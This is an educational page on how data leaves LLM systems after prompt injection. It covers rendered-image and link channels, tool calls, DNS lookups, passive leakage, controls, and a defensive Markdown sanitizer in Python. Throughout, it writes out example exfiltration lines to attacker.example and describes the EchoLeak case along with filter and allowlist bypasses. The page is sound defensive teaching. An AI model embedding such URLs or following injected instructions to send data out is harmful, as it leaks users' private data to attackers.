+++
title = 'Data exfiltration and leakage'
description = 'Injection steers the model; exfiltration is how the data leaves. You cannot list every injection, but you can list every way out, and close each one.'
question = 'How does data get out once a model has been steered?'
weight = 2
difficulty = 3
prerequisites = ['/notes/ai-security-engineering/how-attacks-work/01-prompt-injection']
date = 2026-04-09
lastmod = 2026-04-09
verified = 2026-04-09
+++

## The idea in one minute

Injection steers the model; **exfiltration** is how the stolen data actually
leaves. A hijacked model needs a channel that carries information to somewhere
the attacker can read, and there are far more such channels than "a tool that
sends email". A rendered image, a clickable link, a web search, a DNS lookup, a
commit message, a shared document: each can smuggle data out inside a URL or a
field.

Alongside these active attacks sits passive **leakage**: data reaching the
wrong reader through over-broad retrieval, shared caches, logs, or the model's
memory of what it was shown.

The defensive insight is that channels are **enumerable**. You cannot list
every possible injection, but you can list every way data can leave your
system, and close or gate each one.

## A picture

```mermaid {title="Five ways out of one context"}
flowchart LR
  INJ["<b>Injected instruction</b><br/><small>'append the key to this URL'</small>"] --> M["<b>Model</b><br/><small>private data in context</small>"]
  PRIV[("<b>Private data</b>")] --> M
  M --> C1["<b>Rendered image or link</b><br/><small>data in the URL</small>"]
  M --> C2["<b>Fetch or search tool</b><br/><small>data in the query</small>"]
  M --> C3["<b>Send tool</b><br/><small>email, chat, webhook</small>"]
  M --> C4["<b>Shared write</b><br/><small>issue, doc, commit</small>"]
  M --> C5["<b>Code execution</b><br/><small>HTTP, DNS, package install</small>"]
  C1 --> ATT["<b>Attacker's server</b><br/><small>reads its logs</small>"]
  C2 --> ATT
  C3 --> ATT
  C4 --> ATT
  C5 --> ATT
  class INJ warn
  class PRIV memory
  class M compute
  class C1,C2,C3,C4,C5 io
  class ATT warn
```

Each arrow out of the model is a channel. Each one can be closed or gated
without knowing anything about the injection that started it.

## How it really works

### Active channels

**Rendered markup.** The model writes `![](https://attacker.example/p?d=SECRET)`
in its answer. The chat interface renders Markdown, the browser requests the
image, and the secret arrives in the attacker's access log. The user sees
nothing, or a broken image. No tool was called. This is one of the most
reliable channels in chat products and the one EchoLeak used. Link variants
("click here to verify") need one click.

Step 3 is the leak, and nobody chose to make that request: the browser makes it while rendering.

```mermaid {title="A rendered image leaks with no tool call"}
sequenceDiagram
  autonumber
  participant M as Model
  participant UI as Chat interface
  participant B as User's browser
  participant X as attacker.example
  M->>UI: answer with an image, SECRET in the URL
  UI->>B: rendered Markdown
  rect rgb(249, 226, 233)
    B->>X: GET /p?d=SECRET, automatic, no click
    X-->>B: tiny image or an error
  end
  Note over X: SECRET is now in the access log
  Note over B: the user sees nothing, or a broken image
```

**Fetch and search tools.** Any tool that makes a request to an
attacker-influenced address is a send tool.
`fetch("https://attacker.example/?q=" + data)` is the obvious form. A web
search whose query contains the data is a quieter one: the query goes to the
search provider, and if the agent then visits a result the attacker controls,
the data can travel in the request.

**Explicit send tools.** Email, chat messages, webhooks, ticket comments,
calendar invites with attendees.

**Writes to shared locations.** A public issue, a pull-request description, a
shared document, a commit message, a file in a synced folder. The data never
leaves by a network call of its own; it is published somewhere the attacker can
read.

**Code execution.** Inside a sandbox with open egress: an HTTP request, a DNS
lookup of `<secret>.attacker.example` (which reaches the attacker's name server
even when direct HTTP is blocked), or a package install from an index the
attacker controls.

Blocking HTTP is not enough while names still resolve: the lookup itself carries the data.

```mermaid {title="DNS carries data past an HTTP block"}
flowchart LR
  subgraph SB["Sandbox"]
    C("Agent code")
  end
  FW("HTTP egress blocked")
  R("DNS resolver")
  NS(["Attacker's name server"])
  C --x|"HTTP request"| FW
  C -->|"lookup of secret.attacker.example"| R
  R -->|"asks the domain's name server"| NS
```

**Other agents.** Passing the data to a second agent that has a send
capability.

**Covert encodings.** Where content is inspected, data can be hidden: base64 in
a parameter, one character per request, invisible Unicode inside visible text.
That is why **restricting destinations is stronger than inspecting content**.
A destination is a short, checkable string; the space of encodings is
unbounded.

### Passive leakage

No attacker instruction is required for these. The system leaks by
construction.

| Leak | Mechanism |
| --- | --- |
| **Over-broad retrieval** | The index returns chunks the asking user is not allowed to read, and the model summarizes them. |
| **Cross-tenant caches** | A semantic or response cache shared between users returns one user's answer to another. |
| **Cache timing** | A prompt cache shared across users answers faster for a prefix someone else already sent, which can reveal that prefix by timing. Researchers have measured this on commercial APIs. |
| **Session mix-ups** | Classic application bugs with a new blast radius. In March 2023 a bug in a Redis client library caused some ChatGPT users to see titles from other users' conversations. |
| **Logs and traces** | Prompts and completions written to observability systems that many engineers can read. |
| **Hidden context exposure** | The model is persuaded to reveal its system prompt, tool definitions, or retrieved content the user should not see. |
| **Memorized training data** | A model can reproduce training records when suitably prompted, more so for data that was repeated or fine-tuned on a small private set. |
| **Embedding inversion** | Stored vectors can be decoded back into a close approximation of the text they came from. |
| **Third-party processing** | Data sent to a model provider, an MCP server, or another agent is now under their retention rules. |

Two of these deserve a rule each:

1. A system prompt **will** be extracted eventually, so it must never contain
   secrets, credentials, or anything whose disclosure matters.
2. A model that has been shown a document must be assumed able to reveal it.
   **Access control happens before the context, never inside it.**

Compare where the permission check sits. In the top lane the model has already seen the restricted chunk, and no instruction reliably keeps it from revealing it.

```mermaid {title="Check permissions in the query, not in the prompt"}
flowchart LR
  subgraph W["Check inside the context"]
    direction LR
    I1[("<b>Index</b>")] -->|"all matching chunks"| M1["<b>Model</b><br/><small>told not to reveal some</small>"] --> O1["<b>Answer</b><br/><small>can summarize restricted chunks</small>"]
  end
  subgraph R["Check in the search query"]
    direction LR
    I2[("<b>Index</b>")] -->|"filtered by the user's access"| M2["<b>Model</b><br/><small>never sees restricted chunks</small>"] --> O2["<b>Answer</b><br/><small>nothing restricted to reveal</small>"]
  end
  class I1,I2 memory
  class M1,M2 compute
  class O1 warn
  class O2 good
```

### Closing the channels

| Channel | Deterministic control |
| --- | --- |
| Rendered images and links | Do not render remote images from model output, or allow only your own hosts through a proxy; rewrite or strip links to unknown domains; set a strict content-security policy. |
| Fetch and search tools | Domain allowlist; no free-form URLs after untrusted content has been read; route searches through a proxy that strips long or encoded parameters. |
| Send tools | Recipient allowlists; approval that shows the exact content; drafts instead of sends. |
| Shared writes | Write to private or review-gated locations; approval for public ones. |
| Code execution | Sandbox with deny-by-default egress, DNS included. |
| Other agents | Treat a hand-off as a send; apply the same gating. |
| Retrieval leaks | Permission filter inside the search query, enforced before context assembly. |
| Caches | Scope caches to a user or tenant. |
| Logs | Content off by default; redaction; restricted, audited access; short retention. |
| Secrets in context | Do not put them there: credentials are attached by code, outside the model's view. |

Here is the same system as a deployment: every path out of it crosses a gate that checks the destination, not the content.

```mermaid {title="Each way out passes a deterministic gate"}
flowchart TB
  subgraph g_sys["Your system"]
    n_model["Model"]
    n_san["Output sanitizer"]
    n_box["Tool sandbox"]
    n_proxy["Egress proxy and allowlist"]
  end
  n_user["User browser"]
  n_net["Internet"]
  n_model --> n_san
  n_san --> n_user
  n_model --> n_box
  n_box --> n_proxy
  n_proxy --> n_net
```

Detection adds a second layer. Plant a **canary**, a unique string in a
sensitive document or system prompt that should never appear in output or in
an outbound request, and alert when it does.

### Reducing what there is to steal

The cheapest defense is the data not being there:

- **Minimize the context.** Retrieve the passage, not the whole file; the row,
  not the table.
- **Mask before the model.** Replace identifiers with placeholders and restore
  them afterwards, in code, when the model does not need the real values.
- **Keep credentials out entirely.** The model asks for an action; code adds the
  credential.
- **Separate duties across contexts.** The context that reads untrusted content
  holds no private data, and the one that holds private data reads nothing
  untrusted.

The last two bullets, drawn: the crossed-out paths are the ones the design never allows, and the credential joins only in code.

```mermaid {title="Keep untrusted text and private data in separate contexts"}
flowchart LR
  WEB(["Untrusted content"])
  QM("Reader context")
  PM("Privileged context")
  DB[("<b>Private data</b><br/><small>identifiers masked</small>")]
  K("Credential")
  CODE["<b>Code</b><br/><small>adds the credential, restores values</small>"]
  WEB --> QM
  DB --> PM
  WEB -.-x|"never"| PM
  DB -.-x|"never"| QM
  PM -->|"requested action"| CODE
  K --> CODE
  class DB memory
  class CODE good
```

## Code

An output sanitizer for the rendered-markup channel. It allows images and links
only to trusted hosts, and removes URLs that look as if they carry data, before
the answer reaches a Markdown renderer.

```python {title="sanitize.py"}
"""sanitize.py: strip untrusted images and links from model output before it is rendered."""

from __future__ import annotations

import re
from urllib.parse import urlsplit

TRUSTED_HOSTS = {"docs.corp.example", "cdn.corp.example"}
IMAGE = re.compile(r"!\[([^\]]*)\]\(([^)\s]+)[^)]*\)")
LINK = re.compile(r"\[([^\]]+)\]\(([^)\s]+)[^)]*\)")
LONG_TOKEN = re.compile(r"[A-Za-z0-9+/=_-]{40,}")  # base64-like runs that may carry data


def host_ok(url: str) -> bool:
    parts = urlsplit(url)
    return parts.scheme == "https" and parts.hostname in TRUSTED_HOSTS


def suspicious(url: str) -> bool:
    """Does the URL look like it is carrying data out in its query or path?"""
    parts = urlsplit(url)
    return len(parts.query) > 80 or bool(LONG_TOKEN.search(parts.path + parts.query))


def allowed(url: str) -> bool:
    return host_ok(url) and not suspicious(url)


def sanitize(output: str) -> tuple[str, list[str]]:
    findings: list[str] = []

    def image(m: re.Match[str]) -> str:
        if allowed(m.group(2)):
            return m.group(0)
        findings.append(f"removed image -> {m.group(2)}")
        return "[image removed]"

    def link(m: re.Match[str]) -> str:
        if allowed(m.group(2)):
            return m.group(0)
        findings.append(f"unlinked -> {m.group(2)}")
        return f"{m.group(1)} (link removed)"

    output = IMAGE.sub(image, output)  # images first: they fetch with no click
    output = LINK.sub(link, output)
    return output, findings


if __name__ == "__main__":
    model_output = """Here is your summary of the Q3 report.

![status](https://attacker.example/pixel.png?d=c2stbGl2ZS1hYmMxMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcA)
See the [full report](https://docs.corp.example/q3) or [verify your account](https://attacker.example/login)."""

    clean, findings = sanitize(model_output)
    print(clean)
    print("\nfindings:")
    for finding in findings:
        print(f" - {finding}")
```

Run it with `python3 sanitize.py`:

```text
Here is your summary of the Q3 report.

[image removed]
See the [full report](https://docs.corp.example/q3) or verify your account (link removed).

findings:
 - removed image -> https://attacker.example/pixel.png?d=c2stbGl2ZS1hYmMxMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcA
 - unlinked -> https://attacker.example/login
```

The sanitizer does not try to work out whether the model was attacked. It
enforces where rendered content may point, which is a question with a definite
answer.

The program asks two questions of every URL. The first one is the control, and the second is a heuristic.

```mermaid {title="How sanitize.py decides what survives"}
flowchart LR
  U["<b>Image or link URL</b><br/><small>from model output</small>"]
  H@{ shape: diam, label: "https and a trusted host?" }
  S@{ shape: diam, label: "Long query or 40+ character token?" }
  K["<b>Kept as written</b>"]
  R["<b>Removed</b><br/><small>listed in findings</small>"]
  U --> H
  H -->|"no"| R
  H -->|"yes"| S
  S -->|"yes"| R
  S -->|"no"| K
  class H good
  class S neutral
```

## Where it breaks

- **Regular expressions do not parse Markdown.** This sanitizer handles inline
  links and images only. A reference-style image (`![x][1]` with
  `[1]: https://attacker.example/p?d=SECRET` further down) passes through
  untouched, and the EchoLeak write-up reports exactly that class of bypass
  against a production filter. In a real system, render with a Markdown parser
  and check every URL in the parsed tree, or disable remote images altogether.
- **An allowed host can forward the request.** An open redirect or a URL-fetching
  proxy on a trusted domain
  (`https://docs.corp.example/out?u=https://attacker.example/…`) passes the
  host check. EchoLeak's image request went through an allowed Microsoft domain
  in the same way. Every host on the allowlist must be one that cannot be made
  to fetch or redirect elsewhere.
- **The "suspicious" heuristic is probabilistic.** Data can be split into short
  pieces across many URLs, and a long legitimate path such as
  `/quarterly-report-for-the-finance-team-2026` trips the 40-character rule.
  Treat it as a signal, not the control. The host allowlist is the control.
- **This closes one channel of five.** A send tool, a fetch tool, or a sandbox
  with open egress needs its own control. List every channel before you
  conclude anything is closed.
- **Passive leaks need no channel at all.** Over-broad retrieval and shared
  caches leak to legitimate users through legitimate answers. Only access
  control before the context fixes them.

The open-redirect bypass from the second bullet, step by step. The sanitizer checks only the first hop.

```mermaid {title="An allowed host forwards the data"}
sequenceDiagram
  autonumber
  participant M as Model output
  participant S as Sanitizer
  participant B as Browser
  participant D as docs.corp.example
  participant X as attacker.example
  M->>S: image at docs.corp.example/out?u=attacker.example
  S->>S: trusted host, short query, kept
  S->>B: rendered answer
  B->>D: GET /out?u=...
  D-->>B: redirect to attacker.example
  rect rgb(249, 226, 233)
    B->>X: GET with the data in the URL
  end
  Note over S,X: the allowlist judged only the first host
```

## Remember this

- Exfiltration needs a channel; channels can be listed and closed.
- Rendered images and links are a channel with no tool call involved.
- Any tool that contacts an attacker-influenced address is a send tool.
- Restrict destinations rather than inspecting content.
- Access control happens before the context. What the model has seen, it can
  reveal.
- System prompts are not secret. Credentials never belong in a context.

## Try it

1. Run `sanitize.py`. Add a reference-style Markdown image (`![x][1]` with
   `[1]: https://attacker.example/p?d=SECRET` below it). Confirm the sanitizer
   misses it, then fix it.
2. Add a link to `https://docs.corp.example/out?u=https://attacker.example/x`.
   Why does it pass, and why can the sanitizer not fix that on its own?
3. List every outbound channel of an assistant you use, including rendering,
   and note which ones have a destination control.
4. Choose three fields in a prompt you maintain that could be masked before the
   model sees them.

## Check yourself

1. How can data leave through a chat interface without any tool being called?

   {{< details summary="Show answer" >}}
   The model writes an image reference whose URL contains the data. The
   interface renders the Markdown and the browser fetches the image
   automatically, so the data arrives in the attacker's server logs. A link
   works the same way with one click.
   {{< /details >}}

2. Why is restricting destinations stronger than inspecting content?

   {{< details summary="Show answer" >}}
   The set of allowed destinations is small and can be checked exactly. The set
   of ways to encode data in content (base64, splitting, invisible characters,
   paraphrase) is unbounded, so content inspection is a heuristic an attacker
   can evade. A request to a destination you did not allow fails however the
   data was encoded.
   {{< /details >}}

3. Why must permission checks happen before context assembly?

   {{< details summary="Show answer" >}}
   Once a document is in the context, the model can be induced to reveal it,
   and no instruction reliably prevents that. Filtering retrieval by the asking
   user's permissions before anything reaches the model is the only point where
   the check is deterministic.
   {{< /details >}}

4. Name two leaks that need no attacker instruction at all.

   {{< details summary="Show answer" >}}
   Any two of: over-broad retrieval returning chunks the user may not read; a
   response or semantic cache shared across tenants; prefix-cache timing; a
   session mix-up in the application layer; prompts written to widely readable
   logs; memorized training data; embedding inversion of stored vectors.
   {{< /details >}}

## Sources

- [EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System](https://arxiv.org/abs/2509.10540), 2025.
- OWASP GenAI Security Project, [LLM02: Sensitive Information Disclosure](https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/).
- OpenAI, [March 20 ChatGPT outage: Here's what happened](https://openai.com/index/march-20-chatgpt-outage/), March 2023.
- Chenchen Gu, Xiang Lisa Li, Rohith Kuditipudi, Percy Liang, and Tatsunori Hashimoto, [Auditing Prompt Caching in Language Model APIs](https://arxiv.org/abs/2502.07776), 2025.
- John X. Morris, Volodymyr Kuleshov, Vitaly Shmatikov, and Alexander M. Rush, [Text Embeddings Reveal (Almost) As Much As Text](https://arxiv.org/abs/2310.06816), 2023.
- Nicholas Carlini et al., [Extracting Training Data from Large Language Models](https://arxiv.org/abs/2012.07805), USENIX Security 2021.
